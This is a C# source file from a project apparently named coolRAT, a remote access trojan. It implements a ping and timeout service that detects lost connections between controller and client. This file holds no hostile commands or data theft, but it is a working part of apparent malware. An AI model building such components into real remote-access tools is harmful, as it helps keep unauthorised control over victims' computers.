using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace coolRAT.Libs.Connections
{
    public class ConnectionLostEventArgs : EventArgs
    {
        public Client Client;

        public ConnectionLostEventArgs(Client client)
        {
            Client = client ?? throw new ArgumentNullException(nameof(client));
        }
    }
    public enum PingServiceType
    {
        Active,
        Passive
    }
    public class PingService
    {
        public Client OwnerClient;
        public Thread Ping_Timeout_Clock;
        public int TimeoutTime;
        private bool ResetClock;
        public Guid Last_Checksum;
        public PingServiceType Type;

        public PingService(Client ownerClient, int timeoutTime = 5000)
        {
            OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
            TimeoutTime = timeoutTime;
            ResetClock = false;
        }

        public delegate void ConnectionLostHandler(object sender, ConnectionLostEventArgs e);
        public event ConnectionLostHandler ConnectionLost;

        public void TimeoutClockLoop()
        {
            while(true)
            {
                Thread.Sleep(TimeoutTime);
                if (!ResetClock)
                {
                    // Lost connection.
                    if (ConnectionLost != null)
                    {
                        ConnectionLostEventArgs args = new ConnectionLostEventArgs(OwnerClient);
                        ConnectionLost(this, args);
                    }
                    Stop();
                    break;
                }
                else
                    ResetClock = false;
            }
        }

        public void SendNewPing()
        {
            PingPacket ping = new PingPacket(OwnerClient.UniqueId);
            Last_Checksum = ping.Checksum;
            OwnerClient.SendPacket(ping);
        }

        public void SendNewPing(Guid checksum)
        {
            PingPacket ping = new PingPacket(OwnerClient.UniqueId, checksum);
            OwnerClient.SendPacket(ping);
        }

        public void PingReceived_EventHandler_Active(object s, PacketReceivedEventArgs e)
        {
            if (e.Packet.Type != "PingPacket") return;
            PingPacket packet = PingPacket.Deserialize(e.RawPacket);
            if(packet.Checksum != Last_Checksum)
            {
                if (ConnectionLost != null)
                {
                    ConnectionLostEventArgs args = new ConnectionLostEventArgs(OwnerClient);
                    ConnectionLost(this, args);
                }
                Stop();
            }
            ResetClock = true;
            Thread.Sleep(3000);
            SendNewPing();
        }

        public void PingReceived_EventHandler_Passive(object s, PacketReceivedEventArgs e)
        {
            if (e.Packet.Type != "PingPacket") return;
            PingPacket packet = PingPacket.Deserialize(e.RawPacket);
            ResetClock = true;
            SendNewPing(packet.Checksum);
        }

        public void Start(PingServiceType type)
        {
            Type = type;
            Stop();
            Ping_Timeout_Clock = new Thread(new ThreadStart(TimeoutClockLoop));
            Ping_Timeout_Clock.IsBackground = true;
            Ping_Timeout_Clock.Start();
            switch (type)
            {
                case PingServiceType.Active:
                    OwnerClient.RegisterPacketHandler("PingPacket", PingReceived_EventHandler_Active);
                    Thread.Sleep(3000);
                    SendNewPing();
                    break;
                case PingServiceType.Passive:
                    OwnerClient.RegisterPacketHandler("PingPacket", PingReceived_EventHandler_Passive);
                    break;
            }
        }

        public void Stop()
        {
            if (Ping_Timeout_Clock == null) return;
            if (Ping_Timeout_Clock.IsAlive) Ping_Timeout_Clock.Abort();
            Ping_Timeout_Clock = null;
            OwnerClient.DeregisterPacketHandler("PingPacket");
        }
    }
}
